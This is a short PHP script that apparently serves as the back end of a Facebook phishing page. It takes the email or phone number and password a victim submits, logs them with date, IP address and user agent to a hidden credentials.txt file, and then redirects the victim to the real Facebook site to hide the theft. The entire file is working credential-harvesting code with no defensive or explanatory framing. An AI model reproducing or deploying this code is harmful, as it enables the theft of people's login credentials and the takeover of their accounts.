<?php
session_start();
$date = date('d-m-Y H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];

// Creating the log entry
$log_entry = "
---------------------------------------------
Date: $date
IP Address: $ip
User-Agent: $user_agent
---------------------------------------------
Email/Phone: $email
Password: $password
---------------------------------------------

";

// Saving the captured credentials
$log_file = "../../.server/credentials.txt";
$directory = "../../.server";

// Create directory if it doesn't exist
if (!file_exists($directory)) {
    mkdir($directory, 0777, true);
}

// Append to credentials file
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Redirect to the real Facebook site
header("Location: https://www.facebook.com/");
exit();
?>
